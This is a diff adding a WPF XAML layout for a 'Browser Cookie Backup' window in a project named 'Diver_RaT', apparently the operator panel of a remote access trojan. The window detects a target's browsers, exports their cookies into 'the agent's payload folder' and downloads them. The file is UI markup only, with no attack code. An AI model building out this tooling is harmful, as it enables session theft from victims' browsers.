@@ -1,0 +1,231 @@
+<Window x:Class="Diver_RaT.BrowserWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        mc:Ignorable="d"
+        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
+        xmlns:ui="clr-namespace:Diver_RaT"
+        WindowStyle="None"
+        ResizeMode="CanResize"
+        Title="Browser Cookie Backup" Height="700" Width="1020"
+        WindowStartupLocation="CenterOwner"
+        Background="{StaticResource WindowBgBrush}"
+        Foreground="#E6E8EF"
+        Closing="Window_Closing">
+
+    <Window.Resources>
+        <Style TargetType="GridViewColumnHeader">
+            <Setter Property="Background" Value="#151B28"/>
+            <Setter Property="Foreground" Value="{StaticResource LimeBrush}"/>
+            <Setter Property="FontSize" Value="11.5"/>
+            <Setter Property="FontWeight" Value="SemiBold"/>
+            <Setter Property="Padding" Value="10,7"/>
+            <Setter Property="BorderBrush" Value="#262D3D"/>
+            <Setter Property="BorderThickness" Value="0,0,1,0"/>
+            <Setter Property="HorizontalContentAlignment" Value="Left"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="GridViewColumnHeader">
+                        <Border Background="{TemplateBinding Background}"
+                                BorderBrush="{TemplateBinding BorderBrush}"
+                                BorderThickness="{TemplateBinding BorderThickness}"
+                                Padding="{TemplateBinding Padding}">
+                            <ContentPresenter HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}"
+                                              VerticalAlignment="Center"/>
+                        </Border>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+    </Window.Resources>
+
+    <WindowChrome.WindowChrome>
+        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
+                      CornerRadius="8" UseAeroCaptionButtons="False"/>
+    </WindowChrome.WindowChrome>
+
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+        </Grid.RowDefinitions>
+        <ui:CustomTitleBar Grid.Row="0" Title="Browser Cookie Backup"/>
+        <Grid Grid.Row="1" Margin="16">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="Auto"/>
+        </Grid.RowDefinitions>
+
+        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
+            <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
+            <TextBlock Text="BROWSER COOKIE BACKUP" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
+            <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
+        </StackPanel>
+
+        <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,0,0,8">
+            <Button x:Name="DetectButton" Content="&#x1f50d;  Detect Browsers" Click="DetectButton_Click" Padding="12,0" Height="30"/>
+            <Button x:Name="BackupButton" Content="&#x2193;  Backup Selected" Click="BackupButton_Click" Padding="12,0" Height="30" Margin="8,0,0,0" IsEnabled="False"/>
+            <Button x:Name="DownloadButton" Content="&#x1f4e5;  Download All" Click="DownloadButton_Click" Padding="12,0" Height="30" Margin="8,0,0,0" IsEnabled="False"/>
+            <Button x:Name="PreviewButton" Content="&#x1f50d;  Preview" Click="PreviewButton_Click" Padding="12,0" Height="30" Margin="8,0,0,0" IsEnabled="False"/>
+            <Border Width="1" Background="{StaticResource GlassBorderBrush}" Margin="14,4" VerticalAlignment="Stretch"/>
+            <Button x:Name="ClearButton" Content="Clear Terminal" Click="ClearButton_Click" Padding="12,0" Height="30"/>
+        </StackPanel>
+
+        <Grid Grid.Row="2">
+            <Grid.ColumnDefinitions>
+                <ColumnDefinition Width="270"/>
+                <ColumnDefinition Width="14"/>
+                <ColumnDefinition Width="*"/>
+            </Grid.ColumnDefinitions>
+
+            <Border Grid.Column="0" Background="{StaticResource PanelGlassBrush}" CornerRadius="8"
+                    BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Padding="10">
+                <Grid>
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="*"/>
+                        <RowDefinition Height="Auto"/>
+                    </Grid.RowDefinitions>
+                    <TextBlock Grid.Row="0" Text="INSTALLED BROWSERS" FontSize="11" FontWeight="SemiBold"
+                               Foreground="{StaticResource LimeBrush}" Margin="2,0,0,8"/>
+                    <ListBox x:Name="BrowserList" Grid.Row="1" BorderThickness="0" Background="Transparent">
+                        <ListBox.ItemTemplate>
+                            <DataTemplate>
+                                <CheckBox IsChecked="{Binding IsChecked, Mode=TwoWay}" Foreground="#D6FF7A">
+                                    <StackPanel Orientation="Horizontal">
+                                        <TextBlock Text="{Binding Name}" Foreground="#E6E8EF" FontWeight="SemiBold"/>
+                                        <TextBlock Text="{Binding Details}" Foreground="{StaticResource MutedBrush}" Margin="8,0,0,0" FontSize="11"/>
+                                    </StackPanel>
+                                </CheckBox>
+                            </DataTemplate>
+                        </ListBox.ItemTemplate>
+                    </ListBox>
+                    <TextBlock Grid.Row="2" Text="Check a browser, then press Backup Selected to export cookies per site (Netscape format) into the agent's payload folder."
+                               Foreground="{StaticResource MutedBrush}" FontSize="11" TextWrapping="Wrap" Margin="2,10,2,0"/>
+                </Grid>
+            </Border>
+
+            <Grid Grid.Column="2">
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="2*"/>
+                    <RowDefinition Height="3*"/>
+                </Grid.RowDefinitions>
+
+                <Grid Grid.Row="0" Margin="0,0,0,8">
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="Auto"/>
+                        <ColumnDefinition Width="*"/>
+                        <ColumnDefinition Width="Auto"/>
+                    </Grid.ColumnDefinitions>
+                    <TextBlock Grid.Column="0" Text="SEARCH SITES" FontSize="10" FontWeight="SemiBold"
+                               Foreground="{StaticResource MutedBrush}" VerticalAlignment="Center" Margin="2,0,8,0"/>
+                    <Border Grid.Column="1" Background="#111623" CornerRadius="6"
+                            BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Padding="8,0">
+                        <TextBox x:Name="SearchBox" BorderThickness="0" Background="Transparent" Foreground="#E6E8EF"
+                                 FontSize="12" VerticalContentAlignment="Center" Height="26"
+                                 TextChanged="SearchBox_TextChanged"
+                                 ToolTip="Filter exported sites by name"/>
+                    </Border>
+                    <TextBlock x:Name="FilterCount" Grid.Column="2" Text="0 files" FontSize="11"
+                               Foreground="{StaticResource MutedBrush}" VerticalAlignment="Center" Margin="8,0,0,0"/>
+                </Grid>
+
+                <ListView x:Name="FilesList" Grid.Row="1" BorderThickness="0" Background="Transparent"
+                          AlternationCount="2" VirtualizingPanel.IsVirtualizing="True">
+                    <ListView.ItemContainerStyle>
+                        <Style TargetType="ListViewItem">
+                            <Setter Property="Padding" Value="8,4"/>
+                            <Setter Property="HorizontalContentAlignment" Value="Stretch"/>
+                            <Setter Property="Foreground" Value="#E6E8EF"/>
+                            <Setter Property="SnapsToDevicePixels" Value="True"/>
+                            <Style.Triggers>
+                                <Trigger Property="ItemsControl.AlternationIndex" Value="0">
+                                    <Setter Property="Background" Value="#0D1119"/>
+                                </Trigger>
+                                <Trigger Property="ItemsControl.AlternationIndex" Value="1">
+                                    <Setter Property="Background" Value="#111826"/>
+                                </Trigger>
+                                <Trigger Property="IsMouseOver" Value="True">
+                                    <Setter Property="Background" Value="#1B2436"/>
+                                </Trigger>
+                                <Trigger Property="IsSelected" Value="True">
+                                    <Setter Property="Background" Value="#26324C"/>
+                                </Trigger>
+                            </Style.Triggers>
+                        </Style>
+                    </ListView.ItemContainerStyle>
+                    <ListView.View>
+                        <GridView>
+                            <GridViewColumn Header="Site" Width="220">
+                                <GridViewColumn.CellTemplate>
+                                    <DataTemplate>
+                                        <TextBlock Text="{Binding Site}" Foreground="#E6E8EF" FontWeight="SemiBold"
+                                                   TextTrimming="CharacterEllipsis"/>
+                                    </DataTemplate>
+                                </GridViewColumn.CellTemplate>
+                            </GridViewColumn>
+                            <GridViewColumn Header="Browser" Width="110">
+                                <GridViewColumn.CellTemplate>
+                                    <DataTemplate>
+                                        <TextBlock Text="{Binding Browser}" Foreground="{StaticResource MutedBrush}"/>
+                                    </DataTemplate>
+                                </GridViewColumn.CellTemplate>
+                            </GridViewColumn>
+                            <GridViewColumn Header="Cookies" Width="80">
+                                <GridViewColumn.CellTemplate>
+                                    <DataTemplate>
+                                        <TextBlock Text="{Binding Cookies}" Foreground="#8AA7FF" TextAlignment="Right"/>
+                                    </DataTemplate>
+                                </GridViewColumn.CellTemplate>
+                            </GridViewColumn>
+                            <GridViewColumn Header="Size" Width="90">
+                                <GridViewColumn.CellTemplate>
+                                    <DataTemplate>
+                                        <TextBlock Text="{Binding SizeText}" Foreground="#E6E8EF" TextAlignment="Right"/>
+                                    </DataTemplate>
+                                </GridViewColumn.CellTemplate>
+                            </GridViewColumn>
+                            <GridViewColumn Header="Local" Width="170">
+                                <GridViewColumn.CellTemplate>
+                                    <DataTemplate>
+                                        <TextBlock Text="{Binding LocalPath}" Foreground="#7CFF7C"
+                                                   TextTrimming="CharacterEllipsis" ToolTip="{Binding LocalPath}"/>
+                                    </DataTemplate>
+                                </GridViewColumn.CellTemplate>
+                            </GridViewColumn>
+                        </GridView>
+                    </ListView.View>
+                </ListView>
+
+                <Border Grid.Row="2" Background="#F00A0D09" CornerRadius="8"
+                        BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1" Margin="0,8,0,0">
+                    <Grid>
+                        <Grid.RowDefinitions>
+                            <RowDefinition Height="Auto"/>
+                            <RowDefinition Height="*"/>
+                        </Grid.RowDefinitions>
+                        <StackPanel Orientation="Horizontal" Margin="12,8,12,4">
+                            <TextBlock Text="OPERATION TERMINAL" FontSize="11" FontWeight="SemiBold" Foreground="{StaticResource LimeBrush}"/>
+                            <Ellipse x:Name="BusyDot" Width="7" Height="7" Fill="{StaticResource LimeBrush}" Margin="8,3,0,0"/>
+                        </StackPanel>
+                        <ScrollViewer x:Name="TermScroll" Grid.Row="1" VerticalScrollBarVisibility="Auto"
+                                      HorizontalScrollBarVisibility="Auto">
+                            <TextBlock x:Name="TermBox" FontFamily="Cascadia Mono, Consolas" FontSize="12"
+                                       Foreground="#E6E8EF" TextWrapping="NoWrap" Padding="12,0,12,12"/>
+                        </ScrollViewer>
+                    </Grid>
+                </Border>
+            </Grid>
+        </Grid>
+
+        <TextBlock x:Name="StatusText" Grid.Row="3" Margin="2,8,0,0" FontSize="12"
+                   Foreground="{StaticResource MutedBrush}"/>
+        </Grid>
+        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
+                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
+    </Grid>
+</Window>
